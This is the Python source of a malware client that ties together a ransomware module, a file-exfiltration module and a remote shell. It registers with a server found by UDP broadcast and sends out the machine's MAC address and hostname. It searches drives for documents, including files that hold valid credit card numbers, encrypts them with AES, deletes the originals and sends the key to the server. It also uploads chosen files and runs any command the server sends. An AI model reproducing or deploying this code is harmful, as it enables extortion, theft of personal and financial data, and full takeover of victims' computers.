from Crypto.Cipher import AES
from colorama import Fore, init
import socket, uuid, secrets, time, string
import threading, win32api, win32file, re
import os, subprocess, platform

LOCALHOST = "0.0.0.0"
SERVER_IP = ""
FILE_TRANSFER_PORT = 9002
CLIENT_PORT = 9001
SERVER_PORT = 9000
IP_BROADCAST_PORT = 8999
ENCRPYTION_EXTENSION = ".encbyleaktool"
FILENAME = ""

isEncryptionDone = False # If encryption is done before, prevent re-encryption
keywords_to_not_lookup = ["AppData", "noenter"]

init(convert=True) # Colorama

def print_green(txt):
    print(Fore.GREEN + txt + Fore.RESET)

def print_red(txt):
    print(Fore.RED + txt + Fore.RESET)

def print_blue(txt):
    print(Fore.CYAN + txt + Fore.RESET)

def get_server_ip():
    global SERVER_IP
    
    print_blue("[Get Server IP] Searching for server IP...")   

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # create a UDP socket object
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # allow broadcast on the socket
    s.bind(('0.0.0.0', IP_BROADCAST_PORT)) # bind the socket to the specified port
    
    data, addr = s.recvfrom(1024) # listen for incoming broadcast messages
    SERVER_IP = data.decode('utf-8')
    
    print_green(f"[Get Server IP] Found. Server IP is {SERVER_IP}")
    s.close() # close the socket

def get_mac_address():
    mac = uuid.getnode()
    return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

########### RANSOMWARE START ########### RANSOMWARE START ########## RANSOMWARE START ##########

def generate_key():
    # Generate a random 128-bit key
    key = ''.join(secrets.choice(string.ascii_letters) for i in range(16))

    # Return the key as a 16 character long string
    return key

def send_key(key):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP/IP socket
    sock.connect((SERVER_IP, 9000)) # Connect the socket to the server's address and port
    
    message = "ransomware;storeKey?"
    isSaved = False
    while not isSaved:
        message += "mac=" + get_mac_address() + "&key=" + key
        sock.sendall(message.encode()) # Send the message to the server
        data = sock.recv(1024) # Receive the response from the server
        message = data.decode()
        if message == "SUCCESS":
            isSaved = True
            print_green("[Send Key] Key is sent and stored.")
        elif message == "FAIL":
            print_red("[Send Key] Error occured while sending the key, retrying...")
            time.sleep(1)

    # Close the connection
    sock.close()

def get_hard_drive_list():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    hard_drives = [drive for drive in drives if win32file.GetDriveType(drive) == win32file.DRIVE_FIXED]
    return hard_drives

def validate_credit_card(number):
    """
    Validates a credit card number using the Luhn algorithm.
    Returns True if the number is valid, False otherwise.
    """
    digits = [int(d) for d in str(number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for digit in even_digits:
        checksum += sum([int(d) for d in str(digit*2)])
    return checksum % 10 == 0

def find_credit_cards(filename):
    """
    Searches a text file for valid credit card numbers.
    Returns a list of all the credit card numbers found.
    """
    credit_cards = []
    with open(filename, 'r') as file:
        for line in file:
            matches = re.findall(r'\b\d{13,16}\b', line)
            for match in matches:
                if validate_credit_card(match):
                    credit_cards.append(match)
    return credit_cards

def search_files(keywords, template):
    global isEncryptionDone, keywords_to_not_lookup

    if isEncryptionDone:
        print_red("[Search Files] Encryption is done before.")
        return []
    
    hdds = get_hard_drive_list()
    hdds = ["./TestFiles"] #TODO remove, temporary restriction

    files_to_encrypt = []
    for hdd in hdds:
        for root, dirs, files in os.walk(hdd):
            for file in files:
                path = os.path.join(root, file)
                if ENCRPYTION_EXTENSION in path:
                    print_red("[Search Files] Encryption is done before.")
                    isEncryptionDone = True
                    return []
                if any(word in path for word in keywords_to_not_lookup):
                    continue
                if any(word in path for word in keywords): #if any keyword in the list exists in path
                    if (template == "creditCards" and find_credit_cards(path)) or template == None:
                        #print("Found file for encryption ->", path)
                        files_to_encrypt.append(path)
    
    if len(files_to_encrypt) == 0:
        print_blue("[Ransomware Encryption] Couldn't find any file for encryption.")
        return []
    
    return files_to_encrypt

def encrypt_files(fileList, key):
    """
    Encrypts a file using AES in CBC mode with a given key.
    in_filename: Name of input file to be encrypted
    """
    KEY = bytes(key, "UTF-8")

    #list_files()
    for file_path in fileList:
        chunksize=64*1024 #Size of chunks read from the input file and written to the output file
        out_filename = file_path + ENCRPYTION_EXTENSION

        iv = os.urandom(16)
        encryptor = AES.new(KEY, AES.MODE_CBC, iv)

        filesize = os.path.getsize(file_path)

        with open(file_path, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(filesize.to_bytes(8, byteorder='big'))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))

        os.remove(file_path)
    
    return True

def ransomware_encrypt(keywords, template=None):
    global isEncryptionDone
    isEncryptionDone = False 
    
    key = generate_key()
    send_key(key)
    filesToEncrypt = search_files(keywords, template) # File list for encryption

    if isEncryptionDone:
        return send_response("ransomware;response?msg=ENCRYPTION_IS_DONE_BEFORE")

    if len(filesToEncrypt) > 0:
        isEncryptionDone = encrypt_files(filesToEncrypt, key)

    if isEncryptionDone:
        return send_response("ransomware;response?msg=ENCRYPTION_IS_DONE")
    else:
        return send_response("ransomware;response?msg=ENCRYPTION_FAILED")

def find_encrypted_files():
    hdds = get_hard_drive_list()
    hdds = ["./TestFiles"] #TODO remove

    files_to_decrypt = []
    for hdd in hdds:
        for root, dirs, files in os.walk(hdd):
            for file in files:
                path = os.path.join(root, file)
                if any(word in path for word in keywords_to_not_lookup):
                    continue
                if ENCRPYTION_EXTENSION in path: #if any keyword in the list exists in path
                    #print("Found file for decryption ->", path)
                    files_to_decrypt.append(path)
    
    if len(files_to_decrypt) == 0:
        print_red("[Find Enc. Files] Couldn't find any encrypted file.")
        return []
    
    return files_to_decrypt

def decrypt_files(fileList, key):
    """
    Decrypts a files that was encrypted with AES in CBC mode.
    key: Decryption key (must be 16, 24, or 32 bytes long)
    """  

    for file_path in fileList:
        chunksize=24*1024
        out_filename = os.path.splitext(file_path)[0]
        with open(file_path, 'rb') as infile:
            filesize = int.from_bytes(infile.read(8), byteorder='big')
            iv = infile.read(16)
            decryptor = AES.new(key.encode(), AES.MODE_CBC, iv)

            with open(out_filename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))

                outfile.truncate(filesize)
            
        os.remove(file_path)
    
    print_green("[Ransomware Decryption] Decryption is done.")
    return True

def ransomware_decrypt(key):
    global isEncryptionDone
    isDecryptionDone = False
    
    filesToDecrypt = find_encrypted_files()
    if len(filesToDecrypt) > 0:
        isDecryptionDone = decrypt_files(filesToDecrypt, key)
    else:
        return send_response("ransomware;response?msg=ENCRYPTION_IS_NOT_DONE_BEFORE")
    
    if isDecryptionDone:
        return send_response("ransomware;response?msg=DECRYPTION_IS_DONE")
    else:
        return send_response("ransomware;response?msg=DECRYPTION_FAILED")
     

def manager_ransomware(msg):
    msgType = msg.split("?")[0]
    parameters = msg.split("?")[1].split("&")
    if msgType == "encrypt":
        keywords = []
        template = None
        for parameter in parameters:
            key = parameter.split("=")[0]
            value = parameter.split("=")[1]
            if key == "keywords":
                keywords = value.split(",")
            elif key == "template":
                template = value
        ransomware_encrypt(keywords=keywords, template=template)
    elif msgType == "decrypt":
        decryptionKey = ""
        for parameter in parameters:
            key = parameter.split("=")[0]
            value = parameter.split("=")[1]
            if key == "decryptionKey":
                decryptionKey = value
        ransomware_decrypt(decryptionKey)

############ RANSOMWARE END ############ RANSOMWARE END ############ RANSOMWARE END ############


######### FILETRANSFER START ######### FILETRANSFER START ######### FILETRANSFER START #########

def receive_file():
    global FILENAME

    while True:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((LOCALHOST, FILE_TRANSFER_PORT + 1))     # bind the socket to the IP address and port number
        server_socket.listen(1) # listen for incoming connections
        client_socket, address = server_socket.accept() # accept the client connection
        
        filedata = b''
        while True: # receive the file data from the client
            data = client_socket.recv(1024)
            if not data:
                break
            filedata += data

        server_socket.close()

        print_green(f"\"{FILENAME}\" is received.")
        if "\\" in FILENAME:
            FILENAME = FILENAME.split("\\")[-1]
        if "/" in FILENAME:
            FILENAME = FILENAME.split("/")[-1]

        with open("./" + FILENAME, 'wb') as file:
            file.write(filedata)
        
        FILENAME = ""

def prepare_file_list():
    keywords = [".txt", ".docx", ".pdf", ".mp4", ".jpeg", ".png"]
    
    hdds = get_hard_drive_list()
    hdds = ["./"]

    file_list = []
    for hdd in hdds:
        for root, dirs, files in os.walk(hdd):
            for file in files:
                path = os.path.join(root, file)
                if any(word in path for word in keywords): #if any keyword in the list exists in path
                    #print("Found file for sendFileList ->", path)
                    file_list.append(path)
    
    return file_list

def send_file_list(sep):
    fList = prepare_file_list()
    if len(fList) == 0:
        print_red("[Send File List] Couldn't find any file info to send to the Server.")
        return
    else:
        paths = ""
        for path in fList:
            paths += path + sep
        send_response(f"fileTransfer;fileList?sep={sep}&paths={paths}")

def send_file(path):
    try:
        filedata = b''
        with open(path, 'rb') as file:
            filedata = file.read()

        fname = path.split("/")[-1]
        send_response(f"fileTransfer;save?byteSize={len(filedata)}&fileName={fname}")
        time.sleep(1)

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object    
        client_socket.connect((SERVER_IP, FILE_TRANSFER_PORT)) # connect to server
        print_blue("[Send File] File transfer started.")
        client_socket.sendall(filedata) # send the PDF file to the server    
        client_socket.close() # close the socket connection
        print_green("[Send File] File is sent.")
    except Exception as e:
        print_red("[Send File] Error occurred.")
        print(e)

def manager_fileTransfer(msg):
    global FILENAME
    msgType = msg.split("?")[0]
    parameters = msg.split("?")[1].split("&")
    isSuccess = True
    try:
        if msgType == "sendFileList":
            sep = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "sep":
                    sep = value
            send_file_list(sep)
        elif msgType == "sendFile":
            filePath = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "path":
                    filePath = value
            send_file(filePath)
        elif msgType == "save":
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "fileName":
                    FILENAME = value
    except Exception as e:
        print_red("[File Transfer Manager] Error occurred.")
        print(e)
        isSuccess = False
        
    return isSuccess

########### FILETRANSFER END ########### FILETRANSFER END ########## FILETRANSFER END ##########


############ COMMAND START ############# COMMAND START ############# COMMAND START #############

def execute_command(cmd):
    try:
        print_blue(f"[Execute Command] {cmd}")
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)

        if result.stdout:
            message = result.stdout

        if result.stderr:
            message = result.stderr
    
    except Exception as e:
        print_red(f"[Execute Command] Error occurred.")        #client print test amaçlıdır
    
    return message

def manager_command(msg):
    msgType = msg.split("?")[0]
    parameters = msg.split("?")[1].split("&")
    isSuccess = True
    try:
        if msgType == "execute":
            command = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "cmd":
                    command = value
            execResult = execute_command(command)
            send_response("command;response???cmd===" + command + "&&&result===" + execResult)
    except Exception as e:
        print_red("[Command Manager] Error occurred.")
        #print(e)
        isSuccess = False
        
    return isSuccess

############# COMMAND END ############## COMMAND END ############### COMMAND END ###############

def inform_server():
    computerName = socket.gethostname()
    osName = platform.system()
    info = "info;save?mac=" + get_mac_address() + "&name=" + computerName + "&os=" + osName
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))
    while True:
        client_socket.sendall(info.encode("utf-8"))
        sw_msg = client_socket.recv(1024).decode("utf-8")
        if sw_msg == "SUCCESS":
            print_green("[Inform Server] Device information is sent.")
            break
        elif sw_msg == "FAIL":
            print_red("[Inform Server] Error occured while sending the info, retrying...")
    client_socket.close()

def handle_sw_msg(conn, addr):
    data = b''
    while True:
        data = conn.recv(1024)
        if data:
            break
        
    print("[Handle Message] ", data.decode())
    processType = data.decode().split(";")[0]
    message = data.decode().split(";")[1]
    result = False
    if processType == "fileTransfer":
        result = manager_fileTransfer(message)
    elif processType == "command":
        result = manager_command(message)
    elif processType == "ransomware":
        result = manager_ransomware(message)
    else:
        pass
    conn.sendall(b'SUCCESS' if result == True else b'FAIL')
    conn.close()

def listen_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP/IP socket
    sock.bind((LOCALHOST, CLIENT_PORT)) # Bind the socket to a specific address and port    
    sock.listen(5) # Listen for incoming connections

    print_blue(f'[Listen Server] Client listening on {LOCALHOST}:{CLIENT_PORT}')
    
    while True: # Main loop to accept client connections
        conn, addr = sock.accept() # Wait for a connection
        threading.Thread(target=handle_sw_msg, args=(conn, addr)).start() # Start a new thread to handle the client

def send_response(msg):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the server's address and port
    sock.connect((SERVER_IP, SERVER_PORT))

    # Send the message to the server
    sock.sendall(msg.encode())

    # Close the connection
    sock.close()

if __name__ == "__main__":
    get_server_ip()
    inform_server()
    threading.Thread(target=listen_server).start()
    threading.Thread(target=receive_file).start()